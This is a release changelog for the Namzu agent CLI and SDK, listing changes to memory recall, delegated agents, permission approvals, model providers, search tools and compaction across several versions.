- 7785cb4: Prevent Ctrl+O from repeatedly appending full tool results and diffs to the
  transcript. Older outputs and expansions that exceed the live viewport open in
  a bounded, scrollable detail view. Use arrows and Page Up/Down to navigate,
  left/right to switch outputs, and Escape or Ctrl+O to return. Small results
  still expand in place. Viewing output does not alter conversation history.
- 7785cb4: Show the CLI version, absolute entrypoint and executable-file fingerprint in /status so stale installations can be distinguished from a newer local build with the same package version.
- 7785cb4: Show agent approvals as compact task rows grouped by workflow and phase labels. Full prompts remain accessible with `d`, and long batches retain pagination. Unknown input shapes still open as exact prepared input.
- 7785cb4: Show model discovery as a compact catalogue with provider, exact model ID, context size and effort options. Ctrl+O preserves access to the original JSON. Empty results and unavailable catalogues remain explicit, and malformed output falls back to the ordinary tool view.
- 7785cb4: Refresh Anthropic OAuth credentials before cross-provider agent launches and model discovery instead of reusing the startup token. Concurrent launches share serialized renewal and honor credentials removed or rotated by their owner.
- 7785cb4: Honor GEMINI_CLI_HOME when reusing Gemini CLI Google sign-ins. Read the selected home’s .gemini/oauth_creds.json and avoid falling back to another Linux or Windows account when that explicitly selected owner is signed out. Empty values preserve the normal lookup.
- 7785cb4: Add observed write receipts with operation, UTF-8 byte count, SHA-256 and changed-region preview. Diff presentation accepts an optional summary label. Completed tool events carry bounded diff presentation so hosts do not have to reconstruct it from text. Existing write input, character-size metadata and permission defaults remain unchanged.

  CLI write approvals describe a possible full replacement instead of implying creation; completed writes display the observed operation and diff. Final newline terminators no longer add a phantom line, and real blank lines remain visible. Backends with unknown prior state report Wrote rather than Created.

- 7785cb4: Show one named status row for every observed agent completion, including tasks the model never explicitly waits on. Label active waits with the task name and avoid repeating successful wait protocol payloads in the main transcript. Agent reports remain available through Ctrl+T; unknown waits and tool errors stay visible.
- 7785cb4: Assemble bracketed terminal pastes before editing the composer, normalize Windows line endings and show character counts for collapsed text. Preserve separate assistant messages when a task completion follows an earlier status answer. Delegation receipts now name the running task, and parallel-launch guidance explains how to avoid serial waits.
- 7785cb4: Keep successful wait results visible when a scheduler supplies no assistant transcript for the agent inspector. This preserves the only available report while normal inspected agents retain compact completion rows. Generalize the startup session notice for additional model providers.
- 7785cb4: Queue concurrent terminal permission requests so one agent cannot overwrite another agent’s pending approval. Show the remaining queue count, reset the consent window for each review, and settle all pending reviews on cancellation or application exit. Explicit session-wide approval includes queued reviews.
- 7785cb4: Avoid repeating the project-instructions notice when switching models with the same loaded instruction files. Replacement sessions still load their instructions, and changed non-empty file lists are announced.
- 7785cb4: Fix derived resume titles being stuck at `Conversation` when project instructions were saved before the first user prompt. Preserve explicitly named conversations, add selected-conversation previews on taller terminals, and offer an explicit continuation choice for saved active or paused goals without automatically starting work on resume.

  Use project-scoped session listing in the disk-backed resume picker instead of scanning every project in the application home.

- 7785cb4: Remove the coding doctrine's unconditional read-before-edit instruction. Agents can reuse content from successful prior reads or writes, while re-observing missing, stale or partial evidence and respecting project instructions and tool prerequisites. Clarify that tool intentions and failed calls do not establish completion. Runtime permissions and freshness checks are unchanged.

  Clarify prior-turn action evidence and Namzu’s kernel/SDK identity in the CLI. Make verification proportional to the task and remove unconditional concurrency and child-context claims from shared guidance.

- 7785cb4: Tool review prompts now carry the originating run ID. The CLI uses this identity to show which agent requested an approval, retaining the attribution as concurrent requests advance through the queue. Unrecognized runs display their ID instead of an inferred agent name.
- 7785cb4: Render `/status` as a structured terminal card with aligned fields, wrapping paths and stacked narrow-screen layout. Keep the plain report available in raw mode and account for the card height in transcript scrolling.
- 7785cb4: Refresh the CLI README with compact terminal captures of editing, parallel work and resumed conversations.
- 7785cb4: Replace the bracketed opening banner with a two-row green terminal wordmark.
  Narrow or short terminals use a compact text signature. Version attribution
  remains beside the mark, and the opening header still prints only once.
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
- Updated dependencies [7785cb4]
  - @namzu/sdk@38.0.0
  - @namzu/google@0.2.0
  - @namzu/openai@3.1.0
  - @namzu/computer-use@1.4.2
  - @namzu/anthropic@5.0.0
  - @namzu/ollama@2.2.2
  - @namzu/openrouter@2.4.0

## 21.0.0

### Major Changes

- 4d66337: Make project memory usable across runs, corrections and compaction, with bounded automatic recall in the CLI.

  SDK memory search now matches ranked Unicode terms in titles, summaries and bodies instead of metadata substrings. `search_memory` defaults to active records and 10 results, with limits restricted to 1–50; pass `status: "archived"` to inspect archived records or use the store API for an unbounded listing. Hosts relying on the previous matching algorithm should supply a custom `MemoryIndex` with their intended semantics. `buildMemoryTools` adds `update_memory` and destructive `delete_memory`; hosts that allow only selected tools should filter the returned roster explicitly.

  Disk memory operations now coordinate through a per-store lock and refresh the index for each operation. Read access requires permission to create the lock. Stop older writers before upgrading a shared store. A stale lock left by a crash is reported with its path and requires owner inspection after stopping cooperating processes; the store does not silently steal it or promise a crash-atomic multi-file transaction. `lockTimeoutMs` controls acquisition wait time.

  SDK hosts can opt into `createMemoryRecallStep` through `prepareStep`. Preparation receives the current operator message independently of compacted history, estimated context headroom and cancellation. Checkpoints preserve that intent without duplicating attachment bytes. Both shipped stores provide optional `getRecord` snapshots; custom stores can implement it for consistent status/body reads. Promotion records actual claims and their source, skips exact prior claim sets on a best-effort basis, and leaves archived matches archived. Pin removal and extraction no longer retain a stale final pin or discard negative user requirements.

  CLI automatic recall is now on: each main-session model step can receive up to three active project records, within 6,000 characters and available estimated context headroom, with a one-second deadline. Set `"memory": { "recall": false }` in CLI configuration to retain explicit tool-only retrieval. This setting does not disable memory writes. `compaction.consolidate: true` now chooses consolidation instead of also running the default promoter; omitted or false retains promotion.

  Curated CLI memory files over 1 MiB, malformed text, non-regular files and links escaping their scope are skipped with diagnostics rather than read or overwritten. Split oversized files and keep them inside their intended scope. Notes saved beyond the prompt cap now say that they were saved but excluded from the model's context.

- 539d5bf: Interactive conversations now expose `read_conversation` to page exact retained
  text using the `runId`, `seq`, and new `part` field from `search_conversation`.
  Read and search cursors are distinct and expire; durable event addresses remain
  usable after restarting without a cursor. Oversized records and bytes never
  recorded remain unavailable.

  The interactive prompt now includes a bounded context inventory when visible
  tool output is large or context is under pressure. This changes default prompt
  and tool-catalogue behavior. Embedders requiring the previous exact prompt and
  catalogue must retain the previous CLI version or compose their host using SDK
  hooks without the inventory/read tool. No SDK default changes.

- c056381: Interactive runs and checkpoint resumes now automatically include a bounded
  snapshot of the current run's unfinished tasks in model requests. This changes
  the default prompt even when automatic project-memory recall is disabled.
  Tasks remain scoped to their run and tenant; new runs do not inherit old plans.

  Consumers requiring the previous exact prompt must retain the previous CLI
  version or compose an SDK host without this prepare step. SDK defaults and
  TaskStore APIs are unchanged.

- 67d8438: CLI built-in `bash`, `write` and `edit` calls now act as execution barriers within
  a model-generated batch. Earlier calls settle before them and later calls wait
  for them, instead of concurrency-safe reads overlapping those mutations. SDK
  embedders can retain the old scheduling by leaving `executionBarrier` unset;
  the CLI deliberately uses ordered mutation boundaries. Background shell jobs
  still release the boundary after launch, not after the job finishes.

  Add opt-in `Agent.run_in_background` and `send_message` for queued corrections
  to owned running children. Existing blocking delegation remains the default;
  finished tasks are not restarted. Add direct, session-only host model selection
  for standalone `/model ID` and recognized model-change requests, with model and
  effort previews in the composer. Mixed work remains a model prompt.

- 8a7a4d5: SDK: add `compareHarnessTrials` and `reviewHarnessCandidate` for paired,
  trace-attributed harness verification with fresh confirmation and explicit
  regression/inconclusive decisions. These functions inspect recorded results;
  they do not automatically execute or promote candidates.

  CLI: `search_conversation` now scans large transcripts in bounded pages and
  returns `nextCursor` for continuation. The former 2 MiB whole-file limit becomes
  a 4 MiB per-record limit. Validation now covers the current page's prefix rather
  than the entire run before any result is returned. Consumers relying on whole-run
  validation must validate the full archive themselves. Follow `nextCursor` with
  the same query, and restart searches after cursor expiry or file changes.

- ce514f9: `maxDelegationWidth` now limits pending/active direct child sessions instead of
  all historical children. Completed and failed history remains readable without
  using a live slot. Hosts requiring a lifetime child quota must enforce it
  separately; `capacityBehavior: 'reject'` still fails immediately when live slots
  are full, but does not restore the former lifetime interpretation.

  The CLI now queues excess agent tasks instead of failing them on width. The
  SDK exposes opt-in `AgentManager` queue admission and a bounded pending queue.
  Queued work receives a task ID before execution, rechecks host authority before
  starting, and keeps cancellation and budget ownership with the parent. Queue
  mode allocates tokens across available slots plus a parent share; CLI child
  grants therefore change from geometric halves to that distribution. Total
  configured token limits are unchanged.

  Independent agent workflows now have separate navigation; phases remain inside
  their own workflow. Agent launch approvals show type and capabilities, and
  resource/policy stops visibly explain why a turn ended. Completed delegation
  outputs identify the task and status before the child result, keeping IDs inside
  that result separate from scheduler handles.

### Minor Changes

- 67d8438: Add `search_conversation` to recover exact identifiers and phrases from the current conversation's recorded assistant and tool output after compaction or restart. Searches remain within the host-selected tenant, project and session, return bounded excerpts with run/event references, and report incomplete or unavailable evidence without repeating external work.
- 400cf27: Let the main interactive agent change the current conversation's model
  through `switch_model`, so a request such as “gpt-5.6-luna’ya geç” can use
  the normal model-selection path. The tool accepts an exact model ID and
  optional provider, prefers the current usable provider, and returns choices
  when another provider must be selected explicitly.

  An accepted request is queued until the active turn and its persistence
  settle. Successful application preserves conversation identity and history
  and resets reasoning effort to the new model's default. Cancellation,
  conversation departure or replacement failure retains the current model;
  active delegated agents or background jobs prevent the switch.
  Conversational switches do not change saved defaults and are unavailable
  to headless runs and subagents.

- 035dcbc: Add optional `ModelInfo.reasoningEffortLevels` and `reasoningEffortDefault`
  metadata. The CLI discovers missing model menus through provider catalogues,
  retains established model-specific driver capabilities without extra network
  requests, and intersects usable fallback routes. Third-party drivers can publish effort capabilities without adding
  provider or model cases to the CLI. Unknown menus remain unavailable; absent
  defaults do not erase known choices.
- 035dcbc: After choosing a model in the interactive picker, choose from the new session's supported reasoning-effort levels. Esc keeps the successfully selected model at its default effort, and queued work waits for this step to close. Models without a known non-empty effort menu return directly to the composer; `/effort` remains available separately.
- c635b5a: Use `namzu --output-schema /absolute/path/schema.json` for native schema-constrained TUI answers. Unsupported or lossy schema conversion fails at launch; normal conversations remain unchanged. Supply the flag again on resume.

  Enable native query admission for Codex, OpenRouter, DeepSeek, HTTP and Zen wire mappings. Codex forwards Responses text.format; HTTP maps schemas for both dialects. Zen messages requests use native format instead of hidden tool fallback, and Google requests preserve JSON Schema constraints. Endpoint/model support is still required and vendor errors remain errors.

  Breaking for direct HTTP/Zen callers: an Anthropic-dialect response format can no longer be silently ignored or fall back to an output tool. Schema-free JSON and explicit strict:false are rejected. Use strict native JSON Schema on a capable model, or choose SDK structuredOutput.mode="tool" when native schema output is unavailable.

  Anthropic transport retries now default to zero instead of the vendor SDK default of two. The host immediately receives classified HTTP 429 responses with Retry-After metadata instead of waiting invisibly inside the vendor client. Set AnthropicConfig.maxRetries to 2 to retain the former transport retry behavior.

  Rate-limit guidance no longer claims automatic retries were exhausted when retry policy may have disabled them or refused the requested delay.

- 2b0d90d: Add optional exact-word constraints through `MemorySearchParams.requiredIdentifiers`
  in the built-in memory stores, applied before ranking and limiting results.

  SDK hosts can opt into `createMemoryRecallStep({ identifierGrounding: true })`;
  CLI users can set `memory.identifierGrounding: true`. Queries containing mixed
  letter/digit identifiers then require one of those identifiers in an automatically
  recalled record. Explicit memory tools keep their broad search behavior.

  The option defaults to false. The live comparison removed irrelevant automatic
  recall but did not improve factual accuracy and used more tokens, so this is a
  precision control for suitable workloads, not a promoted performance default.
  Exact spelling can miss aliases or renamed identifiers.

- 67d8438: Search the model picker by model ID or display name, with bounded results and visible current/default markers on narrow terminals. Type to filter or press `/` first to search for names beginning with the existing `p` or numeric shortcuts. Backspace edits the query, Ctrl+U clears it, and Enter applies only a matching selection.
- 73de124: `run-stream` terminal `done` events now carry the kernel's settled result in
  optional `text`, including an intentionally empty guarded result. Hosts should
  use that field for the final answer; earlier deltas can include progress and
  answers rejected by verification. Interrupted streams without a settled result
  can omit it.

  Buffered `namzu run` text and JSON output now use that same final result, fixing
  concatenation of intermediate narration and rejected completion claims. Fallback
  answer-only history persistence also uses the settled result. Partial output on
  provider failure or pause remains available with the existing nonzero exit.

- 0795da3: Add optional Zen and Zen Go providers for OpenCode's services using Namzu's
  existing model contract. Exact service/model catalogue entries select Chat Completions,
  Responses, Anthropic Messages or Google streaming transport. Tool
  continuations, native reasoning metadata, conversation attribution,
  cancellation and classified provider errors remain part of the normal
  Namzu kernel lifecycle.

  The CLI exposes Zen (`zen`) and Zen Go (`zen-go`) in provider selection and
  headless runs. Zen supports anonymous public models and optional credentials;
  Go requires its own key. The actual Namzu
  conversation is retained for service attribution across turns and resume.
  The driver requires Node.js 20+ and a supported public model, or a real key
  with a known model or explicit protocol. Bundled prices are estimates;
  unsupported controls and content combinations are refused.

- 4cac9ca: Enable Zen's current public models without requiring an account key or an
  OpenCode installation. Anonymous SDK calls and the CLI's Zen default use
  `muse-spark-1.3-contributor-free`. Omitted, blank or `public` Zen keys select
  anonymous access, restricted to six explicitly supported free model IDs;
  paid or unknown models still require a real key. The SDK keeps
  `glm-5.3-flash` as the default for credentialed Zen and Go calls, and Go
  continues to require its own API key.

  The CLI uses environment keys first, then reuses separate `opencode` and
  `opencode-go` API-key entries from `OPENCODE_AUTH_CONTENT` or OpenCode's
  data-directory `auth.json`, including the paired Windows home on WSL when
  no absolute XDG override is supplied.
  It leaves that file unchanged and does not reinterpret OAuth records as
  API keys. Explicit `OPENCODE_API_KEY=public` selects anonymous access and
  suppresses secondary Zen key aliases and stored account keys. With no
  credential, Zen appears as public access without a login
  or key prompt. Public model availability and service limits remain under
  the upstream service's control.

  Expose `@namzu/zen/models` for catalogue functions and model types without
  loading the four native transport adapters during provider selection.

  Send `strict: false` for all Responses function tools so optional parameters,
  including nested read/edit fields, remain optional. This fixes HTTP 400
  schema rejection when a backend defaults omitted strictness to true.
  Responses also declines the capability-dependent `enforceToolInputSchema`
  hint for these general schemas; Namzu continues to validate inputs before
  tool execution. Other protocols retain their existing enforcement behavior.

### Patch Changes

- 6973fa8: Stop repeating accepted conversational model switches. A successful solitary
  `switch_model` call now ends the turn through the kernel's terminal-tool path,
  without another inference to acknowledge it. Repeated requests for the same
  accepted target reuse that reservation. Failed requests remain correctable;
  mixed tool batches keep their existing result-relay behavior.

  Show a compact target row and host-confirmed application instead of duplicating
  the pending receipt. Rank missing-model suggestions before limiting them to
  eight choices. Let the kernel mount `search_tools` only when deferred tools
  exist, avoiding an empty discovery call in ordinary interactive sessions.

- 7587d43: Keep long conversation names and goal objectives editable in narrow terminals.
  The text editor now scrolls with its cursor while keeping its title and action
  keys visible, without shortening saved values or splitting Unicode characters.
- 1a7420d: Remove repeated startup identity from the interactive transcript. The opening
  header shows Namzu and its version; current model, reasoning effort and working
  directory stay in the footer. Normal startup no longer prints the same connection
  again, and the composer supplies the typing hint. Explicit provider/model changes
  still confirm their result, reasoning confirmations are shorter, and configuration
  warnings, instruction-file disclosure and failures remain visible. Provider/tool
  details remain available through `/status` and `/status tools`.

  Fix repeated transcript rows after terminal contraction while preserving the
  conversation, draft and selected agent. Subagent screens now page tabbed and
  Unicode output within the frame; phase and agent panes have distinct boundaries,
  and completed status is no longer repeated as activity text.

- 7587d43: Keep completed delegated results available to `wait_for_task` after the manager
  evicts terminal task records. A parent can retrieve the full output retained in
  its task ledger, including text omitted from completion notifications, without
  launching another child. Results remain restricted to the parent that launched
  the task.
- Updated dependencies [fdd76aa]
- Updated dependencies [67d8438]
- Updated dependencies [4d66337]
- Updated dependencies [c78fd3f]
- Updated dependencies [d045660]
- Updated dependencies [67d8438]
- Updated dependencies [c5cf4de]
- Updated dependencies [4a46cb2]
- Updated dependencies [c5cf4de]
- Updated dependencies [086ade9]
- Updated dependencies [035dcbc]
- Updated dependencies [c635b5a]
- Updated dependencies [e81a109]
- Updated dependencies [e81a109]
- Updated dependencies [2b0d90d]
- Updated dependencies [8a7a4d5]
- Updated dependencies [f370947]
- Updated dependencies [ce514f9]
- Updated dependencies [f370947]
- Updated dependencies [481b3d5]
- Updated dependencies [c78fd3f]
- Updated dependencies [d045660]
- Updated dependencies [b4408d6]
- Updated dependencies [b33dc98]
- Updated dependencies [b4408d6]
- Updated dependencies [0795da3]
- Updated dependencies [4cac9ca]
  - @namzu/anthropic@5.0.0
  - @namzu/openai@3.0.0
  - @namzu/sdk@37.0.0
  - @namzu/openrouter@2.4.0
  - @namzu/deepseek@1.2.0
  - @namzu/zen@1.0.0
  - @namzu/computer-use@1.4.2
  - @namzu/ollama@2.2.2

## 20.0.0

### Major Changes

- 32ef6f6: Make builtin `grep` enumerate files incrementally instead of listing an entire directory tree before searching. It stops at 20,000 examined entries and has a 15-second tool deadline, replacing the previous 120-second deadline. Narrow the search directory or include pattern when these bounds are reached. The default result limit remains 100; reaching it now explicitly reports an incomplete search rather than claiming that every file was searched. Partial matches and traversal errors remain visible.

  Custom sandbox adapters must implement `Sandbox.walkFiles` for content search; `grep` refuses adapters that only provide eager `listFiles`, without falling back to the host filesystem. Existing recursive include semantics and the 5 MiB per-file limit remain in place. Oversized files are skipped before reading when size metadata is available, and cancellation stops consuming pending reads.

- 0662f34: Make glob scope explicit and bound filesystem discovery while it runs. Bare `*` and `*.ts` now search only the selected directory; use `**/*` or `**/*.ts` to recurse. Wildcard searches exclude hidden entries by default; set `include_hidden: true` to retain searches that previously included them inside a sandbox. Glob returns regular files only and skips symlink entries during enumeration; authorized local root aliases remain supported. Its execution deadline changes from the generic 120 seconds to 15 seconds, so large searches should use a narrower directory or pattern.

  Glob now uses the optional `Sandbox.walkFiles` capability instead of collecting a complete recursive `listFiles` inventory. Custom sandbox adapters must implement `walkFiles` to support builtin glob; unsupported adapters receive an explicit failure without a host fallback. Local, Docker, ACI and Firecracker adapters implement bounded incremental enumeration. `SandboxWalkFilesOptions` and `walkFilesViaExec` are exported for adapter authors. The sandbox package now requires the matching SDK major through its peer dependency because it imports this new runtime helper.

  Result and traversal limits produce explicit incomplete-search metadata and preserve available matches. Patterns are limited to 4,096 characters and 256 brace expansions, with consistent hidden-file matching in grouped alternatives. Sandbox search paths are resolved once, fixing duplicated absolute paths in glob, grep and ls. Runtime guidance permits direct reads of known paths, and the CLI tool label now shows both the glob pattern and directory.

- 65dc528: Make `/memory show` and `/memory list` inspect curated memory instead of saving the words `show` or `list`. `/memory add <text>` explicitly saves a note; empty `add` displays usage. To save a literal reserved word, use `/memory add show`, `/memory add list` or `/memory add add`. A leading `--user` keeps user scope; ordinary free-text notes remain supported. The inspection and add keywords are case-insensitive. Memory reports now show labelled sections, full file paths and bounded previews, without printing instructions intended for the model.

  Permission menus now use plain preset labels, place advanced modes and rules under More options, and show the effective session approval state. Settings use named controls and reflect a previous approval of all tools. The approval prompt explicitly labels its session-wide all-tools choice. Underlying permission rules, mode shortcuts and sandbox restrictions are unchanged.

### Minor Changes

- f11a628: Add `/help <command>` to read usage and availability without running the command. `/help /permissions` also works. Bare `/help` keeps its command picker. Local commands explain their supported arguments, kernel commands retain their registered hints, and custom commands show their full source path and whether arguments are accepted without expanding the saved prompt. Help uses the same command precedence as execution.
- 32ef6f6: Let the interactive parent respond to new messages while delegated agents continue working. An interrupted delegation wait returns the running task's identity instead of waiting for every child to finish, and eventual results reach the same parent run once. Parent cancellation still stops its children. Cancelled CLI turns retain the kernel's tool and reasoning history so a follow-up can see work already performed.

  The model can retrieve a task's complete output using `wait_for_task`, including text beyond a notification's preview. This only accepts tasks owned by the current parent run. Budget-stopped tasks retain available partial prose and report their stop reason.

  Add optional `query({ waitForInbound })` arrival notification and cancellable `CompletionInbox.waitForArrival(timeoutMs, signal)` waits. Neither consumes operator messages or cancels child work; callers release arrival listeners when the supplied signal aborts. Task-completion notifications include the child's stop reason when available.

  Open child transcripts in a distinct framed terminal screen with more visible history, line/page scrolling and explicit return navigation. Completed children remain readable through `/agents` while retained in the current session. Returning to the main conversation restores its draft.

### Patch Changes

- afa0712: Keep completed tool receipts when cancellation interrupts a post-tool hook, withholding unreviewed output and failure-log details while preserving execution status. Cancellation stops retry scheduling, and calls cancelled before execution receive an explicit not-started result. Provider cancellation no longer waits on a blocked iterator, and unknown token spend remains reserved even when the idle timeout is disabled.

  Shell commands now report incremental progress on the host as well as in a sandbox. Sandbox timeouts preserve partial stdout and stderr; clipped output no longer recommends blindly replaying a command.

  The CLI retains long first lines and output beyond 200 lines for Ctrl+O and raw view. Long lines receive bounded, expandable previews. The composer header fits very narrow terminals, and animation regressions cover a complete border lap and cleanup.

- 073a877: Show the beginning and end of long tool output with an omission count between them. Final diagnostics are visible before expansion, while Ctrl+O and raw view retain the complete admitted output.

  The model picker now names other available providers beside a prominent provider-switch action. A detected Claude connection remains discoverable while browsing another provider's models; browsing does not change the active provider or saved preferences.

- Updated dependencies [32ef6f6]
- Updated dependencies [0662f34]
- Updated dependencies [afa0712]
- Updated dependencies [32ef6f6]
- Updated dependencies [073a877]
  - @namzu/sdk@36.0.0
  - @namzu/computer-use@1.4.1
  - @namzu/anthropic@4.0.4
  - @namzu/ollama@2.2.2
  - @namzu/openai@2.1.0
  - @namzu/openrouter@2.3.2

## 19.0.0

### Major Changes

- 2bcd95e: Make interactive command selection and reporting reflect the active session.

  The CLI now opens a goal menu for `/goal` and the delegated-agent view for
  `/agents`. Use `/goal status` for a goal report and `/agents available` for
  the configured roster. `/status`, `/cost`, `/context`
  and `/mcp` show concise reports; use the `details` variants or `/mcp tools`
  for expanded diagnostics. Usage is labeled as current or latest run usage.
  Searchable help, skill, branch and commit menus treat typed digits as search
  text; use arrows and Enter to select. Esc cancels previous-prompt editing.

  `/settings` shows effective model, reasoning and permission settings. Changing
  a model preserves fallbacks and subagent preferences and saves only after
  successful activation. `/tasks` reads the current or latest run's real store,
  with no task state carried across conversation switches.

  Resume hints include the working directory and the actual Node executable and
  CLI entrypoint, preventing a checkout build from handing its UUID session to
  an older global installation. Embedded hosts can supply their own launch
  command; otherwise their hint uses `namzu`.

  The SDK goal command reserves `status` for inspection and `set` for explicit
  creation. To create an objective literally named `status`, use `/goal set status`.
  The previous bare `/goal status` created that objective. Goal reports now use
  `enabled`/`paused` and `Automatic turns` instead of `armed`/`disarmed` and
  `Rounds admitted`; consumers parsing human-readable reports must update.

- f6a46b2: New working directories inside a Git checkout now share the checkout-root Project,
  conversation list and searchable memory. Previously every exact working directory
  created a separate Project. Existing directory bindings retain their IDs, Topics
  and histories; worktrees, nested repositories and standalone directories remain
  separate. Existing records are not merged or moved. Use a separate checkout or
  application home when new work needs separate history.

  New project memory files created from a repository subdirectory now live at the
  checkout root. An existing directory-local `.namzu/MEMORY.md` still takes precedence,
  including an empty file. Create that local file before writing notes to retain
  directory-specific memory.

  Concurrent first launches now use one installation identity and one Topic per
  Project. Malformed existing identity or Topic metadata causes an error instead
  of being silently overwritten. Preserve or repair that metadata before retrying;
  replacing an identity changes which tenant's history the CLI can access.

- e15e923: Fewer slash commands: what a key already does is not also a command, and what one command already shows is not also another.

  **Removed** (38 → 26). Each line names what to use instead.

  - `/expand [n]` → **Ctrl+O**. Opens the collapsed tool bodies still on screen in place; once they have scrolled away it reprints the most recent one in full. The collapse hint now reads `… +N lines · ctrl+o`. Numbered reopening of older bodies is gone with the numbers.
  - `/agent` → **Ctrl+T** (the delegated-work inspector; the command had already been hidden from help).
  - `/clear-screen` → **Ctrl+L**.
  - `/mention` → type **`@`** in the composer.
  - `/quit` → `/exit`.
  - `/title` → `/rename`; `/rename clear` removes the saved name.
  - `/skill` → `/skills` (`/skills <name>` activates directly).
  - `/provider`, `/pwd` → `/status`, which already shows both.
  - `/tools` → `/status tools`.
  - `/debug-config` → `/status config`.
  - `/remember <text>` → `/memory <text>`; bare `/memory` still shows what is remembered.

  A removed spelling is answered with "Unknown command: /x. Try /help." rather than silently sent to the model as prose. Scripts and muscle memory that used one of the old names are what this breaks; nothing else on the surface changed.

  Kept on purpose: `/new` (a fresh conversation that leaves the screen alone is a different act from `/clear`), `/raw` (a distinct rendering mode with no key), `/effort` (the scriptable form of Shift+↑/↓).

- 22cf680: The CLI has an identity. A tenant id is minted once per installation (`~/.namzu/identity.json`) and a topic id once per project (`projects/<id>/cli/topic.json`); every project, conversation and run is filed under them instead of the kernel's `tnt_unknown_legacy` placeholder and the constant `top_namzu-cli`. A conversation's id is chosen when the session opens and written under it at first use, so `session_start` hooks, logs and the screen all name the same id. The workspace-local legacy state backend (`<cwd>/.namzu/cli.json` pointing at a project stored inside the repository) is no longer read: state lives in the application home only, and `namzu state` reports what is there without minting anything. Conversations are matched to a project by project id alone.
- 22cf680: Memory has a project scope. `#note` and `/memory <text>` now append to `<project>/.namzu/MEMORY.md`, not to `~/.namzu/MEMORY.md`; `/memory --user <text>` writes the user file. Every turn is given the project file, the user memory file and `USER.md`, each capped at 8,000 characters with a line naming what was left out. A workflow that relied on `#note` reaching every project should use `--user`.
- 3ad8784: **Sessions run the kernel's `salience` compaction by default.** The context is held near half the model's window by scoring every message and clearing what the run has stopped using, before any summary; `/context` shows what it did. The previous behaviour is one line in the config file: `compaction: { strategy: structured }`.
- 47e573c: Kernel ID factories, file-lock IDs and SDK-managed Docker/ACI sandbox IDs now generate UUID v4 strings instead of prefixed random strings. Nominal TypeScript entity brands remain, but their underlying type is an opaque string rather than a prefixed template literal. Before upgrading, remove prefix parsing and prefix-only validators in consumers; use checked constructors or the new `isEntityId(value, kind)` predicate and validate ownership through store records. Public Project, Run and Message schemas accept only UUIDs while remaining Zod string schemas. External sandbox/orchestrator IDs retain their service-defined contracts.

  `InvalidIdError.expectedKind` replaces `expectedPrefix`; hosts displaying validation errors must read the entity kind instead. Built-in HTTP/webhook connector IDs and the default shell-hook plugin ID are now stable UUIDs.

  Prefixed records, including formerly accepted safe prefixes, are no longer admitted. Constructors, schemas and disk readers require UUIDs. No automatic migration or deletion is performed. Supply UUIDs for custom IDs and use a fresh dedicated application home when previous state is no longer needed. Do not downgrade UUID stores to a prefix-only reader.

  In-memory session and topic stores accept existing Project/Topic snapshots without creating replacement identities. The CLI uses this to bind delegation to the actual parent run, conversation, project and tenant. Child artifacts now live beneath the owning Project's `subagents/sessions` tree, without another generated Project layer. Scripts inspecting the old nested subagent layout must follow the new paths for new children; historical artifacts remain in place. Completed parent runs release their delegated children and bookkeeping. Tasks default to the actual invoking run instead of `run_namzu-cli`.

  CLI state selectors, session maps and transcript export require UUIDs; export skips the reserved emergency-snapshot directory. Emergency-to-checkpoint projection uses the snapshot's existing UUID. The CLI always selects the checkout-root binding, even when an older directory-specific Project exists. Historical records are left in place and are not merged. Durable `drain` now requires an authoritative persisted Session and takes its Topic from that record; checkpoint-only hosts must persist the Session metadata before draining.

- 87c0034: Enforce one token allowance across a parent run and its delegated descendants.
  Previously the parent and delegation pool each received the full configured
  budget. Parent, child and SDK auxiliary model requests now share measured usage
  and finite child reservations. Unknown provider spend blocks further admission.

  Replace `AgentTaskContext.budgetTracker` with a shared `TokenBudget` account at
  `budget`. Custom schedulers must expose that same account, and custom agents must
  use the supplied provider/account for model work. Run and agent usage describe
  own-run counters; the new `budget` summary reports
  subtree usage separately. `RouterAgent.usage` previously included its delegate;
  read `budget.treeTokens` for that aggregate and `delegateResult.cost` for child
  pricing. Router and Pipeline report unpriced own tokens when their own calls
  have no price attribution, instead of pairing own usage with a child cost or
  a misleading zero.
  Update consumers that assumed a parent and every child could independently spend
  the full configured token budget. Foreign dispatch without metering is refused.

  Durable run-state version 4 and checkpoint schema 2 reference an independent
  canonical ledger. Old checkpoint readers must be upgraded before resuming these
  runs. Missing ledgers, conflicting scopes/caps and unresolved provider receipts
  are refused rather than resetting available tokens. In-memory accounts require
  their authoritative handle on resume; moving a durable tree between processes
  requires exclusive root ownership.
  An explicitly recovered final provider receipt can be applied through
  `reconcileRequest`; automatic recovery never clears unknown spend.

  Fix the CLI's scheduler parameter forwarding so delegated work uses the parent
  query's authority. Streaming usage includes the separate budget summary.

### Minor Changes

- 4025c75: `/add-dir <path>` lets the file tools reach another directory for the rest of the session — by absolute path, bound read-write into the sandbox from the next turn — and `/add-dir` alone lists them. `--add-dir <path>` (repeatable) does it for one launch, and `additionalDirectories` in the config file for every session. The model is told which directories it may reach in the environment prompt, and `/status` lists them under where it may write.
- bdb7fac: `/release-notes [version]` shows what changed in the version that is running, read from the CHANGELOG that now ships in the package. `/agents`, from the kernel, was already listing the delegates. (`Esc Esc` on an empty composer, which opens the picker of earlier prompts to fork from, was already there; the backlog had it wrong.)
- 4dcb485: Background jobs that work the way the tool description promised. A session now owns a job registry: `bash` with `run_in_background` starts a job that outlives the turn, the model is told on its next tool result when a job ends, and the transcript shows a `⚙` row whether or not a turn is running; a job that ends between turns is reported to the model at the start of the next one. `/jobs` lists them. Jobs stop when the session closes. Under a sandbox no job can start, as before — the registry runs on the host and the kernel refuses to seat it beside a sandbox.
- 37d1c27: A file-only `compaction` key: `strategy: salience` opts a project into the kernel's salience-scored working set (every message scored, the context held near half the window, no model in the loop), and `contextWindowTokens` overrides the window the kernel resolves from the model for a project that wants compaction earlier or knows its model's window better than the table. Absent, nothing changes: the structured strategy and the model's own window. The transcript row for a pass now also counts the narrations it stubbed. A `/context` command shows how full the window is, which strategy the session runs with its thresholds, and what the passes so far cleared, stubbed, summarised and reclaimed; `/cost` names the strategy instead of a fixed 70%. `consolidate: true` writes each run's decisions, discoveries and failures to the project's memory store as a `learning` a later session's `search_memory` finds.
